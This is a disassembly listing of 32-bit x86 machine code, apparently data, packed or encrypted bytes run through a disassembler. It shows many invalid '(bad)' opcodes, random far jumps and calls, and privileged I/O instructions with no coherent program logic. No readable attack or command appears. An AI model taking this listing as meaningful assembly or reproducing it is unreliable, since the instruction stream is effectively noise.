  423557:	xlat   BYTE PTR ds:[ebx]
  423558:	mov    cl,0x69
  42355a:	push   ebx
  42355b:	push   ds
  42355c:	inc    eax
  42355d:	or     eax,0xbe59dca9
  423562:	xor    BYTE PTR [esi-0x4],ah
  423565:	fsub   st(6),st
  423567:	addr16 cmp ebx,edx
  42356a:	and    al,0x81
  42356c:	dec    ebp
  42356d:	inc    edx
  42356e:	xchg   ecx,eax
  42356f:	iret   
  423570:	adc    edi,DWORD PTR [ebp-0x2f]
  423573:	add    cl,ch
  423575:	leave  
  423576:	jl     0x4235b8
  423578:	inc    ecx
  423579:	adc    BYTE PTR [esi-0x490e7d0a],0x6b
  423580:	loop   0x423527
  423582:	je     0x4235fc
  423584:	mov    bl,0xa4
  423586:	repz ror eax,1
  423589:	and    BYTE PTR [esp+0x698eb11b],dh
  423590:	mov    ch,0x57
  423592:	mov    eax,0x7212f221
  423597:	mov    bh,BYTE PTR [esi+0x71]
  42359a:	lahf   
  42359b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42359c:	pop    eax
  42359d:	das    
  42359e:	stos   DWORD PTR es:[edi],eax
  42359f:	loope  0x4235ed
  4235a1:	fwait
  4235a2:	xor    dh,ah
  4235a4:	cs jnp 0x42361c
  4235a7:	imul   ecx,DWORD PTR [edi-0x61925f7a],0x3e2d30ac
  4235b1:	jbe    0x423581
  4235b3:	xchg   ebx,eax
  4235b4:	adc    al,0x40
  4235b6:	(bad)  
  4235b7:	sbb    ecx,esp
  4235b9:	sub    DWORD PTR [edx+0x31],0x8ff0b77d
  4235c0:	pop    es
  4235c1:	lahf   
  4235c2:	(bad)  
  4235c3:	clc    
  4235c4:	sbb    al,BYTE PTR [ebp+0x4b]
  4235c7:	ss (bad) 
  4235c9:	scas   eax,DWORD PTR es:[edi]
  4235ca:	xchg   ebp,eax
  4235cb:	sub    al,BYTE PTR [esi-0x3ebeff55]
  4235d1:	(bad)  
  4235d2:	xor    ebp,edi
  4235d4:	sub    BYTE PTR [ebx+0x3fff8c7f],0xa8
  4235db:	mov    esp,DWORD PTR [edi+esi*8-0x13]
  4235df:	push   esi
  4235e0:	cmc    
  4235e1:	sub    al,0xe1
  4235e3:	cwde   
  4235e4:	push   ss
  4235e5:	cld    
  4235e6:	and    DWORD PTR [edx-0x6e335411],edi
  4235ec:	jge    0x4235cb
  4235ee:	hlt    
  4235ef:	sahf   
  4235f0:	and    ch,ch
  4235f2:	cli    
  4235f3:	out    0x22,eax
  4235f5:	inc    ecx
  4235f6:	xor    bh,bl
  4235f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235f9:	and    edi,DWORD PTR [ebx+0x42]
  4235fc:	(bad)  
  4235fd:	jg     0x4235a5
  4235ff:	cdq    
  423600:	push   ebx
  423601:	icebp  
  423602:	adc    DWORD PTR [ebx-0x5b],ebp
  423605:	jle    0x423644
  423607:	jp     0x4235d6
  423609:	mov    esp,0x815f5365
  42360e:	fist   WORD PTR [ebx+0x29]
  423611:	imul   ebx,DWORD PTR [edx+esi*2-0x34],0x62
  423616:	repz das 
  423618:	hlt    
  423619:	dec    ebx
  42361a:	sbb    al,0x68
  42361c:	fwait
  42361d:	xchg   DWORD PTR [eax+eax*2+0x43243950],esi
  423624:	add    al,0x9c
  423626:	daa    
  423627:	jns    0x423647
  423629:	jmp    0xd884:0x58262a4
  423630:	xor    DWORD PTR [eax],0xffffffc5
  423633:	stos   DWORD PTR es:[edi],eax
  423634:	pop    eax
  423635:	ret    0xa7f6
  423638:	and    al,0x79
  42363a:	pop    edx
  42363b:	inc    ebx
  42363c:	lock aas 
  42363e:	add    eax,0x5a2bc60
  423643:	lock or cl,BYTE PTR [ecx-0x7]
  423647:	jp     0x42364f
  423649:	cmp    ebx,edi
  42364b:	adc    al,0x13
  42364d:	in     eax,dx
  42364e:	jb     0x4236b6
  423650:	(bad)  
  423651:	or     eax,0x1acd8bb2
  423656:	cs jl  0x423608
  423659:	les    edi,FWORD PTR [edi+0x4b829060]
  42365f:	mov    cs,edi
  423661:	mov    esp,0x9c2f9067
  423666:	rcl    BYTE PTR [eax+0x74],0x73
  42366a:	mov    eax,0x178b06bc
  42366f:	repnz (bad) 
  423671:	mov    edx,0x8ea2e2ee
  423676:	or     BYTE PTR [ebx-0x76419b7f],dh
  42367c:	xchg   DWORD PTR [esi-0x70702313],edi
  423682:	jns    0x42367e
  423684:	cli    
  423685:	jno    0x423678
  423687:	call   0x135b:0x59f7e32f
  42368e:	imul   BYTE PTR [eax+0x3ec68cbc]
  423694:	cmp    BYTE PTR [ebp+0x5e],dl
  423697:	scas   al,BYTE PTR es:[edi]
  423698:	mov    ch,0x1e
  42369a:	sti    
  42369b:	sub    bl,bh
  42369d:	out    0x44,al
  42369f:	std    
  4236a0:	jno    0x4236f4
  4236a2:	xor    BYTE PTR [edx+esi*8-0x756b49cf],0x63
  4236aa:	enter  0x17ef,0x96
  4236ae:	out    0x69,eax
  4236b0:	dec    edx
  4236b1:	shl    dl,cl
  4236b3:	sahf   
  4236b4:	jno    0x42372e
  4236b6:	frstor [edi+0x3c91af2b]
  4236bc:	or     BYTE PTR [ebp+0x5f],al
  4236bf:	sub    esp,DWORD PTR [eax-0x2d]
  4236c2:	gs cmp ah,al
  4236c5:	ins    BYTE PTR es:[edi],dx
  4236c6:	enter  0x68dd,0x37
  4236ca:	mov    edi,0xa0b6b873
  4236cf:	sbb    eax,esi
  4236d1:	push   edx
  4236d2:	sbb    bh,bl
  4236d4:	pop    es
  4236d5:	adc    BYTE PTR [ecx-0x26413700],cl
  4236db:	nop
  4236dc:	iret   
  4236dd:	cmp    DWORD PTR [edi],esi
  4236df:	xchg   ebp,eax
  4236e0:	add    esp,esi
  4236e2:	inc    ebp
  4236e3:	jbe    0x423724
  4236e5:	mov    dl,0x70
  4236e7:	scas   al,BYTE PTR es:[edi]
  4236e8:	mov    ecx,0x509123ee
  4236ed:	outs   dx,BYTE PTR ds:[esi]
  4236ee:	fidivr DWORD PTR [esi+0x1a]
  4236f1:	sbb    dh,dh
  4236f3:	xchg   esi,eax
  4236f4:	xchg   DWORD PTR [ebp-0x706e4348],esp
  4236fa:	xor    DWORD PTR [edx-0x52],eax
  4236fd:	and    al,0xe7
  423700:	cmp    BYTE PTR [ecx],bl
  423702:	pop    esp
  423703:	push   cs
  423704:	push   0xffffffd0
  423706:	adc    edx,edx
  423708:	push   ebp
  423709:	in     al,0xc1
  42370b:	xor    dl,ah
  42370d:	sub    eax,0x7859d708
  423712:	push   ds
  423713:	aaa    
  423714:	mov    ecx,0x2138411b
  423719:	sbb    al,0x26
  42371b:	loop   0x42371f
  42371d:	outs   dx,BYTE PTR ds:[esi]
  42371e:	mov    ebx,edi
  423720:	fsubr  QWORD PTR [edi]
  423722:	xchg   edi,eax
  423723:	or     al,0xe
  423725:	or     ecx,edx
  423727:	mov    ecx,0xb1787576
  42372c:	mov    al,0x85
  42372e:	fwait
  42372f:	retf   
  423730:	add    al,0x2e
  423732:	ds adc al,ah
  423735:	add    DWORD PTR [edi+0x1d],0xffffffea
  423739:	into   
  42373a:	retf   0x9b34
  42373d:	and    al,0x81
  42373f:	xchg   esp,eax
  423740:	into   
  423741:	lea    eax,[ebp+0x1c]
  423744:	xor    bh,bl
  423746:	xchg   ebx,eax
  423747:	jbe    0x42371f
  423749:	clc    
  42374a:	pop    ebx
  42374b:	inc    esp
  42374c:	rcr    BYTE PTR [eax+0xd],1
  42374f:	loopne 0x42372d
  423751:	(bad)  
  423752:	jno    0x42374d
  423754:	dec    edx
  423755:	mov    edx,0x3973cc6c
  42375a:	add    esi,DWORD PTR [ebp+esi*1-0x65]
  42375e:	jns    0x42372b
  423760:	jmp    0x423762
  423762:	je     0x4237be
  423764:	jl     0x4237cb
  423766:	inc    ecx
  423767:	push   cs
  423768:	(bad)  
  423769:	cmp    DWORD PTR [ebx+esi*1],ebx
  42376c:	aam    0x91
  42376e:	daa    
  42376f:	jnp    0x42377d
  423771:	pop    esi
  423772:	pop    edi
  423773:	icebp  
  423774:	fmul   QWORD PTR [ebx-0x72]
  423777:	push   es
  423778:	lods   eax,DWORD PTR ds:[esi]
  423779:	cwde   
  42377a:	xor    DWORD PTR [ebp+0x33],eax
  42377d:	repz dec ebp
  42377f:	push   0xbe9c5c1d
  423784:	fiadd  DWORD PTR [edx]
  423786:	mov    cl,BYTE PTR [ebx-0x26]
  423789:	adc    BYTE PTR [edi],0x5f
  42378c:	xchg   esi,eax
  42378d:	inc    esi
  42378e:	popf   
  42378f:	scas   eax,DWORD PTR es:[edi]
  423790:	lock adc al,0x6d
  423793:	outs   dx,BYTE PTR ds:[esi]
  423794:	cmp    edx,esp
  423796:	inc    edx
  423797:	inc    edi
  423798:	add    DWORD PTR [edx-0x17],edx
  42379b:	and    eax,0x5e52f08a
  4237a0:	int3   
  4237a1:	jge    0x423802
  4237a3:	jb     0x423821
  4237a5:	pop    esp
  4237a6:	xor    eax,0x757476c6
  4237ab:	add    al,0xea
  4237ad:	ret    
  4237ae:	mov    al,0xe2
  4237b0:	dec    eax
  4237b1:	mov    al,ds:0x5338400c
  4237b6:	shr    BYTE PTR ds:0x5eea5e61,cl
  4237bc:	hlt    
  4237bd:	test   DWORD PTR [ecx+0x6c2fd7ec],esp
  4237c3:	jnp    0x423839
  4237c5:	dec    ecx
  4237c6:	cmp    BYTE PTR [esi+0x7c],0xe1
  4237ca:	callw  0x3e84
  4237ce:	mov    ch,0xa8
  4237d0:	jnp    0x423784
  4237d2:	(bad)  
  4237d3:	mov    ds:0xd1e1b557,eax
  4237d8:	aad    0x24
  4237da:	arpl   WORD PTR [ecx+0x70fe9880],ax
  4237e0:	popf   
  4237e1:	or     edi,DWORD PTR [edx+0x47]
  4237e4:	cs out dx,al
  4237e6:	jl     0x4237c5
  4237e8:	out    0x73,eax
  4237ea:	mov    ch,0xaf
  4237ec:	adc    BYTE PTR [eax-0x5c],bh
  4237ef:	sahf   
  4237f0:	es jbe 0x423859
  4237f3:	imul   esp,DWORD PTR [ebp+0x35d8646b],0x7b
  4237fa:	xchg   ecx,eax
  4237fb:	(bad)  
  4237fc:	push   ebx
  4237fd:	jmp    0x42385d
  4237ff:	and    al,0x51
  423801:	(bad)  
  423802:	lahf   
  423803:	popf   
  423804:	pop    ebp
  423805:	pop    ebx
  423806:	or     edi,DWORD PTR [ebp-0x47ca017f]
  42380c:	cmc    
  42380d:	push   ebp
  42380e:	in     al,0x72
  423810:	and    BYTE PTR [ecx-0x3f9dbf75],ah
  423816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423817:	ds jge 0x42386c
  42381a:	push   edi
  42381b:	call   0x6318:0xf2dab9a6
  423822:	popa   
  423823:	pushf  
  423824:	(bad)  
  423825:	jno    0x423884
  423827:	mov    ch,0x2b
  423829:	test   al,0xd4
  42382b:	call   0x6c6e9592
  423830:	je     0x4237c7
  423832:	inc    edi
  423833:	adc    ah,BYTE PTR [ecx+eax*2-0x53]
  423837:	pop    ss
  423838:	cld    
  423839:	cmp    edi,ecx
  42383b:	into   
  42383c:	sbb    ch,ch
  42383e:	add    bl,bl
  423840:	jae    0x42388b
  423842:	mov    dh,0x6f
  423844:	inc    edx
  423845:	add    DWORD PTR [ebx-0x4908b71e],edx
  42384b:	and    BYTE PTR [ecx+0x12e2aff2],dh
  423851:	scas   eax,DWORD PTR es:[edi]
  423852:	or     al,0x55
  423854:	data16 or BYTE PTR [edx+0x106c9fe6],0xf
  42385c:	es inc ecx
  42385e:	add    al,0x1f
  423860:	xchg   ecx,ebx
  423862:	or     BYTE PTR [ecx],bh
  423864:	cs (bad) 
  423866:	int    0xe1
  423868:	sahf   
  423869:	in     eax,dx
  42386a:	mov    DWORD PTR [ecx],ecx
  42386c:	gs pop es
  42386e:	test   edx,ecx
  423870:	pop    edx
  423871:	fst    QWORD PTR [eax-0x5a686a57]
  423877:	pop    esp
  423878:	mov    edx,0x554df8f2
  42387d:	sbb    bh,ch
  42387f:	gs xor eax,0xa09a223f
  423885:	dec    ecx
  423886:	dec    edx
  423887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423888:	cmp    DWORD PTR [eax+0x3a22c5ef],0xffffff92
  42388f:	or     al,0xd5
  423891:	add    BYTE PTR [ecx],ch
  423893:	addr16 mov dh,0xa
  423896:	xchg   BYTE PTR [ebx],ch
  423898:	dec    esp
  423899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42389a:	or     eax,0x6c00a959
  42389f:	adc    dl,ah
  4238a1:	loop   0x423910
  4238a3:	pop    esp
  4238a4:	inc    edx
  4238a5:	icebp  
  4238a6:	jl     0x4238a7
  4238a8:	iret   
  4238a9:	lock mov al,ds:0xb35c7f62
  4238af:	push   ebp
  4238b0:	xchg   DWORD PTR [edx*4+0x7e91b6e6],ecx
  4238b7:	int3   
  4238b8:	cmc    
  4238b9:	(bad)  
  4238ba:	ja     0x423877
  4238bc:	lods   al,BYTE PTR ds:[esi]
  4238bd:	pop    ebx
  4238be:	xor    esp,DWORD PTR [esi+0x6c5ffd99]
  4238c4:	(bad)  
  4238c5:	idiv   BYTE PTR [esi-0x2377cdba]
  4238cb:	sub    eax,0xdfe022c8
  4238d0:	and    BYTE PTR [esi-0x64],ah
  4238d3:	pop    ebp
  4238d4:	push   0x52
  4238d6:	xor    DWORD PTR [ebp-0x6d],0x50
  4238da:	std    
  4238db:	jmp    0xbf4b:0xb7b9117f
  4238e2:	xchg   ecx,eax
  4238e3:	mov    ah,0x38
  4238e5:	loopne 0x42390c
  4238e7:	stos   BYTE PTR es:[edi],al
  4238e8:	call   0x17bd:0x1cf13dda
  4238ef:	mov    esi,0x9fdc5ebb
  4238f4:	xlat   BYTE PTR ds:[ebx]
  4238f5:	in     al,0x6
  4238f7:	fdivr  st,st(3)
  4238f9:	(bad)  
  4238fa:	int3   
  4238fb:	add    al,0x9d
  4238fd:	and    BYTE PTR [esi],dh
  4238ff:	loopne 0x423911
  423901:	rcr    DWORD PTR [eax+0x7e4a6175],0x4a
  423908:	fisubr WORD PTR [ebx+0x24bc0069]
  42390e:	pop    eax
  42390f:	jmp    0xcb4:0xae36b76a
  423916:	loope  0x4238e1
  423918:	adc    BYTE PTR [edx+0x27],0x33
  42391c:	pop    eax
  42391d:	xchg   esp,eax
  42391e:	cmp    BYTE PTR [ebp*4+0x3a2c2882],bl
  423925:	dec    esp
  423926:	ficomp WORD PTR gs:[eax-0x46bb963a]
  42392d:	cli    
  42392e:	popf   
  42392f:	push   ds
  423930:	xchg   esp,eax
  423931:	sti    
  423932:	cmp    eax,0x6cf899e
  423937:	aas    
  423938:	or     DWORD PTR [edx],edx
  42393a:	shl    DWORD PTR [ebp+0x5d04541c],cl
  423940:	pop    ss
  423941:	lds    ebx,FWORD PTR [edi-0x77]
  423944:	fst    QWORD PTR [ecx-0xb7542e7]
  42394a:	mov    ch,0x60
  42394c:	inc    edi
  42394d:	imul   ebx,DWORD PTR [edi+0x20],0xffffffb9
  423951:	js     0x4239c5
  423953:	and    edx,ecx
  423955:	jns    0x42394b
  423957:	mov    ebp,0x5866bae8
  42395c:	lea    edx,[eax+0xe284ce8]
  423962:	lea    ebp,[edx+eax*8]
  423965:	inc    ebp
  423966:	mov    ds:0x9cb810d6,al
  42396b:	loopne 0x42397e
  42396d:	(bad)  
  42396e:	js     0x423990
  423970:	aas    
  423971:	ss into 
  423973:	inc    edx
  423974:	fwait
  423975:	inc    esp
  423976:	xchg   ecx,eax
  423977:	xchg   ecx,eax
  423978:	xor    al,0x7b
  42397a:	sbb    DWORD PTR [ebp-0x6922c71b],0xb7d58b4
  423984:	icebp  
  423985:	mov    ch,0xa
  423987:	jge    0x42393d
  423989:	out    0x84,al
  42398b:	pop    ds
  42398c:	ss adc eax,0xfd1529c4
  423992:	clc    
  423993:	xchg   BYTE PTR [ebp-0x54e3509d],al
  423999:	and    eax,0x9b5e99f1
  42399e:	ret    0x2d6f
  4239a1:	adc    eax,0x29ce750f
  4239a6:	or     esi,esp
  4239a8:	push   es
  4239a9:	test   al,0x6c
  4239ab:	aas    
  4239ac:	repz xchg ecx,eax
  4239ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239af:	dec    esi
  4239b0:	mov    ah,0xee
  4239b2:	pop    ss
  4239b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239b4:	out    0xb0,eax
  4239b6:	mov    ds:0x237fd416,al
  4239bb:	push   esi
  4239bc:	(bad)  
  4239bd:	(bad)  
  4239be:	jo     0x423941
  4239c0:	(bad)  
  4239c1:	dec    ebp
  4239c2:	out    dx,al
  4239c3:	inc    edi
  4239c4:	in     al,0xc3
  4239c6:	ret    
  4239c7:	icebp  
  4239c8:	mov    eax,0xf7be7356
  4239cd:	sar    DWORD PTR [esp+esi*1],cl
  4239d0:	ror    dl,0xa0
  4239d3:	cmp    BYTE PTR [ebp-0x407dbbd9],cl
  4239d9:	or     bh,bh
  4239db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239dc:	test   DWORD PTR [eax+0x6c80150b],esp
  4239e2:	call   0x5086:0x55cbf2b4
  4239e9:	pusha  
  4239ea:	fbld   TBYTE PTR [ecx]
  4239ec:	xor    BYTE PTR [ecx+eax*1+0x35],ch
  4239f0:	jb     0x423a35
  4239f2:	cmp    bl,BYTE PTR [esi+ecx*1+0x61]
  4239f6:	ins    DWORD PTR es:[edi],dx
  4239f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239f8:	sar    BYTE PTR [edx+0x0],cl
  4239fb:	leave  
  4239fc:	push   esp
  4239fd:	pop    ebp
  4239fe:	inc    ecx
  4239ff:	retf   
  423a00:	and    esp,DWORD PTR [edi+0x36]
  423a03:	xchg   edi,eax
  423a04:	dec    ebx
  423a05:	jg     0x423a6b
  423a07:	mov    ah,0xc7
  423a09:	jmp    0x3b41:0xdaf3366a
  423a10:	pop    ebx
  423a11:	push   ss
  423a12:	xor    BYTE PTR [ebx],cl
  423a14:	sbb    ebx,ebp
  423a16:	and    ch,bl
  423a18:	repnz ins DWORD PTR es:[edi],dx
  423a1a:	es pop ds
  423a1c:	push   es
  423a1d:	lods   al,BYTE PTR es:[esi]
  423a1f:	popf   
  423a20:	(bad)  [eax-0x2ef5d919]
  423a26:	push   ds
  423a27:	xor    esi,DWORD PTR [esi+0x360a2008]
  423a2d:	sbb    al,0x4b
  423a2f:	xor    BYTE PTR [edi+0x6a0042ad],dh
  423a35:	lods   eax,DWORD PTR ds:[esi]
  423a36:	and    edx,eax
  423a38:	sbb    dl,BYTE PTR [ecx]
  423a3a:	sub    al,0xf7
  423a3c:	fstp   DWORD PTR [eax-0x7166985f]
  423a42:	adc    dl,ch
  423a44:	fiadd  WORD PTR [edx]
  423a46:	popa   
  423a47:	das    
  423a48:	mov    dl,0x4e
  423a4a:	xor    DWORD PTR [edx],0xdef06ac4
  423a50:	enter  0xc9d8,0xbf
  423a54:	sahf   
  423a55:	xor    dh,BYTE PTR [ebx-0x3b]
  423a58:	stos   BYTE PTR es:[edi],al
  423a59:	inc    edi
  423a5a:	pop    esi
  423a5b:	inc    eax
  423a5c:	pusha  
  423a5d:	pop    eax
  423a5e:	jl     0x423a9c
  423a60:	adc    al,0x32
  423a62:	inc    esp
  423a63:	or     eax,DWORD PTR fs:[eax+0x19]
  423a67:	fbstp  TBYTE PTR [edi+0x3]
  423a6a:	fucomi st,st(3)
  423a6c:	inc    ebp
  423a6d:	mov    al,ds:0x7f0d8df6
  423a72:	mov    WORD PTR [edi-0x21d017f0],?
  423a78:	sbb    cl,BYTE PTR [ebx+0x25]
  423a7b:	enter  0xcf0c,0xcf
  423a7f:	cmp    BYTE PTR [edx],al
  423a81:	xchg   edx,eax
  423a82:	sub    ecx,DWORD PTR [edx+0x5f]
  423a85:	add    BYTE PTR [ebx-0x4c],bh
  423a88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a89:	sub    ebp,esi
  423a8b:	repz cmp esi,edx
  423a8e:	sub    cl,BYTE PTR [edx-0x51]
  423a91:	call   0x1243e693
  423a96:	ss jecxz 0x423a61
  423a99:	mov    esi,edx
  423a9b:	lods   al,BYTE PTR ds:[esi]
  423a9c:	push   ss
  423a9d:	jo     0x423ad1
  423a9f:	xor    edi,esi
  423aa1:	imul   ebp
  423aa3:	adc    BYTE PTR [ebx],dl
  423aa5:	mov    WORD PTR [ebx-0x19],?
  423aa8:	jg     0x423b00
  423aaa:	sub    eax,0xb7468ebf
  423aaf:	les    ebx,FWORD PTR [eax]
  423ab1:	lods   eax,DWORD PTR ds:[esi]
  423ab2:	pop    ebp
  423ab3:	hlt    
  423ab4:	mov    dl,BYTE PTR [edi-0x7b14aa5e]
  423aba:	out    0x40,eax
  423abc:	jmp    0xb4f8:0x623d6d4e
  423ac3:	mov    bl,0x40
  423ac5:	push   ecx
  423ac6:	ins    DWORD PTR es:[edi],dx
  423ac7:	in     eax,0x9
  423ac9:	xor    eax,0xceaae891
  423ace:	(bad)  
  423acf:	mov    bh,0x76
  423ad1:	pop    edi
  423ad2:	out    0xcd,al
  423ad4:	(bad)  
  423ad5:	sub    cl,BYTE PTR [ebp+eiz*1+0x65b0654f]
  423adc:	dec    DWORD PTR [eax-0x216c50f0]
  423ae2:	adc    DWORD PTR [eax-0x4fc49082],0x4a382729
  423aec:	js     0x423abb
  423aee:	je     0x423af7
  423af0:	lods   al,BYTE PTR ds:[esi]
  423af1:	adc    al,0xa0
  423af3:	repz mov ds:0x78434a5b,eax
  423af9:	sub    ah,BYTE PTR [esi+0x517ca78]
  423aff:	cdq    
  423b00:	and    al,0x12
  423b02:	pop    edx
  423b03:	mov    dl,0xad
  423b05:	dec    edi
  423b06:	loope  0x423af7
  423b08:	hlt    
  423b09:	dec    edx
  423b0a:	cli    
  423b0b:	jg     0x423b44
  423b0d:	stos   BYTE PTR es:[edi],al
  423b0e:	jae    0x423b20
  423b10:	hlt    
  423b11:	inc    edi
  423b12:	cdq    
  423b13:	stos   BYTE PTR es:[edi],al
  423b14:	push   0xc1104a22
  423b19:	mov    ch,0x93
  423b1b:	and    DWORD PTR [edi+0x52ea81a3],ecx
  423b21:	sahf   
  423b22:	(bad)  
  423b23:	int3   
  423b24:	sub    bl,BYTE PTR [ebp+0x20b5a74]
  423b2a:	pop    ds
  423b2b:	repz ret 
  423b2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b2e:	clc    
  423b2f:	rep ins BYTE PTR es:[edi],dx
  423b31:	lahf   
  423b32:	call   0xf798:0x569026c5
  423b39:	mov    dh,0x1e
  423b3b:	push   edi
  423b3c:	jmp    0x423b3b
  423b3e:	ins    DWORD PTR es:[edi],dx
  423b3f:	dec    edi
  423b40:	mov    esp,eax
  423b42:	add    al,0x9d
  423b44:	sub    eax,0x91452ef6
  423b49:	push   es
  423b4a:	and    eax,0x2d684fab
  423b4f:	cld    
  423b50:	dec    edx
  423b51:	loopne 0x423b18
  423b53:	cwde   
  423b54:	jne    0x423b44
  423b56:	push   ss
  423b57:	aad    0x96
  423b59:	adc    DWORD PTR [edx],esp
  423b5b:	push   0xffffff91
  423b5d:	sub    ah,BYTE PTR [esi+0x465960c3]
  423b63:	xor    dh,BYTE PTR [eax+0x53]
  423b66:	xchg   ebp,eax
  423b67:	adc    ecx,0x91a2a0a2
  423b6d:	lods   al,BYTE PTR ds:[esi]
  423b6e:	call   0x4c34:0x90bbc276
  423b75:	mov    esp,0x63206cc9
  423b7a:	or     dh,BYTE PTR [edi]
  423b7c:	push   ecx
  423b7d:	mov    al,0x24
  423b7f:	push   es
  423b80:	pop    eax
  423b81:	leave  
  423b82:	sbb    DWORD PTR [edx+0x47],eax
  423b85:	lahf   
  423b86:	jl     0x423bd1
  423b88:	rcr    BYTE PTR [esi-0x54],0x29
  423b8c:	mov    ds:0xb60535fb,eax
  423b91:	adc    DWORD PTR [ebx+edi*8-0x22],ecx
  423b95:	xchg   ecx,eax
  423b96:	add    bh,dl
  423b98:	sbb    BYTE PTR [ebp+0x24],ch
  423b9b:	pop    ss
  423b9c:	aaa    
  423b9d:	call   0x47c1690f
  423ba2:	dec    DWORD PTR [edi]
  423ba4:	push   edx
  423ba5:	xchg   edi,eax
  423ba6:	outs   dx,DWORD PTR ds:[esi]
  423ba7:	mov    ds:0x669332a0,eax
  423bac:	shl    BYTE PTR [eax-0x5a71e68d],1
  423bb2:	mov    cl,0xff
  423bb4:	push   ds
  423bb5:	cmp    ecx,0x58
  423bb8:	rol    esi,0x42
  423bbb:	mov    ds:0x9c88d244,al
  423bc0:	mov    ebx,0xd11a3db8
  423bc5:	stc    
  423bc6:	inc    esi
  423bc7:	sub    al,0xe2
  423bc9:	std    
  423bca:	sub    eax,0x56073c93
  423bcf:	pusha  
  423bd0:	ror    ebp,cl
  423bd2:	inc    ebx
  423bd3:	and    al,0xf6
  423bd5:	fs je  0x423c0f
  423bd8:	push   edi
  423bd9:	pop    ss
  423bda:	neg    bh
  423bdc:	push   ebp
  423bdd:	scas   eax,DWORD PTR es:[edi]
  423bde:	dec    edx
  423bdf:	(bad)  
  423be0:	push   0x3cafafb2
  423be5:	(bad)  
  423be6:	sub    BYTE PTR ds:0x34cfc851,cl
  423bec:	bound  eax,QWORD PTR [eax+eiz*4]
  423bef:	(bad)  
  423bf0:	pop    ecx
  423bf1:	and    edx,0x58
  423bf4:	stos   BYTE PTR es:[edi],al
  423bf5:	imul   ecx,DWORD PTR [esi+0x78],0xe38288a5
  423bfc:	ficom  WORD PTR [edx]
  423bfe:	push   0x36
  423c00:	fiadd  DWORD PTR [edx+0x4d]
  423c03:	add    eax,0x40e9d47
  423c08:	dec    edi
  423c09:	adc    BYTE PTR [edx-0x3966dded],al
  423c0f:	mov    esi,0xb9a683d1
  423c14:	gs out 0x1e,eax
  423c17:	ror    DWORD PTR [eax-0x6eef3ed5],1
  423c1d:	es inc edi
  423c1f:	adc    al,0x2c
  423c21:	sbb    al,0x99
  423c23:	add    ebx,DWORD PTR [edi]
  423c25:	jge    0x423c36
  423c27:	icebp  
  423c28:	add    bl,BYTE PTR [ecx+0x2e]
  423c2b:	pop    esp
  423c2c:	mov    ds:0x43b9741b,al
  423c31:	push   0x6f
  423c33:	sti    
  423c34:	mov    bh,0x9b
  423c36:	inc    ebx
  423c37:	nop
  423c38:	imul   esp,DWORD PTR [ebx],0xf064a2cc
  423c3e:	or     al,0x77
  423c40:	cwde   
  423c41:	jmp    0x6f2fda83
  423c46:	dec    edi
  423c47:	pop    edi
  423c48:	inc    esi
  423c49:	pushf  
  423c4a:	and    dh,ah
  423c4c:	sbb    dl,bh
  423c4e:	dec    DWORD PTR [eax+0x2e790204]
  423c54:	dec    eax
  423c55:	js     0x423cb5
  423c57:	mov    esi,0xa76208eb
  423c5c:	xlat   BYTE PTR ds:[ebx]
  423c5d:	(bad)  
  423c5f:	sbb    BYTE PTR [eax],dl
  423c61:	pop    ebx
  423c62:	jl     0x423ca1
  423c64:	cwde   
  423c65:	adc    al,0x8b
  423c67:	and    ebx,edi
  423c69:	outs   dx,BYTE PTR ds:[esi]
  423c6a:	cwde   
  423c6b:	mov    edx,0xa9fdef29
  423c70:	repnz xor eax,0x49e16280
  423c76:	jno    0x423c1d
  423c78:	adc    bl,BYTE PTR [edx+eax*1-0x175585c0]
  423c7f:	jmp    0x5cbecd7c
  423c84:	jmp    0x423c7a
  423c86:	add    edi,esi
  423c88:	imul   esi,DWORD PTR [edx+0x0],0xdf2169fb
  423c8f:	fucomip st,st(6)
  423c91:	imul   eax
  423c93:	adc    cl,0x56
  423c96:	mov    ah,0xf
  423c98:	lds    eax,FWORD PTR [ebx]
  423c9a:	or     al,0x38
  423c9d:	int    0x7c
  423c9f:	cmp    BYTE PTR [edi+edx*8],0xd7
  423ca3:	lock jno 0x423c6a
  423ca6:	scas   al,BYTE PTR es:[edi]
  423ca7:	jne    0x423c76
  423ca9:	xor    eax,0xb483b1e0
  423cae:	pop    ds
  423caf:	sub    BYTE PTR [edx-0x1258054b],bl
  423cb5:	call   0xe62e3b81
  423cba:	shl    edi,1
  423cbc:	add    DWORD PTR [edi-0x25ee93f4],eax
  423cc2:	rcl    DWORD PTR [edx+0x2556a939],cl
  423cc8:	push   0x1f
  423cca:	sub    al,0x14
  423ccc:	xchg   DWORD PTR [ebp+0x318f0d10],esi
  423cd2:	sub    ch,0x87
  423cd5:	stos   BYTE PTR es:[edi],al
  423cd6:	push   esp
  423cd7:	push   ecx
  423cd8:	lods   al,BYTE PTR ds:[esi]
  423cd9:	add    DWORD PTR [ebp+0x1c],ebp
  423cdc:	out    0x11,eax
  423cde:	fcomp  DWORD PTR [ebp-0x7dccc1d2]
  423ce4:	adc    eax,0xdbd7237f
  423ce9:	mov    esi,0x20ca4073
  423cee:	mov    ah,0xb6
  423cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cf1:	xchg   esi,eax
  423cf2:	(bad)  
  423cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cf4:	repnz setl BYTE PTR [ebp-0x6e004b92]
  423cfc:	cmp    al,BYTE PTR [esi]
  423cfe:	xchg   edi,eax
  423cff:	mov    cl,0x9f
  423d01:	xor    ebx,esi
  423d03:	test   ebx,edx
  423d05:	test   BYTE PTR [ebp+0x70],ah
  423d08:	ins    DWORD PTR es:[edi],dx
  423d09:	popf   
  423d0a:	std    
  423d0b:	inc    eax
  423d0c:	mov    al,ds:0x224b74b
  423d11:	call   0x8d86:0x304f6036
  423d18:	into   
  423d19:	int    0x6b
  423d1b:	mov    edx,0xb9e2ad32
  423d20:	(bad)  [di+0x74]
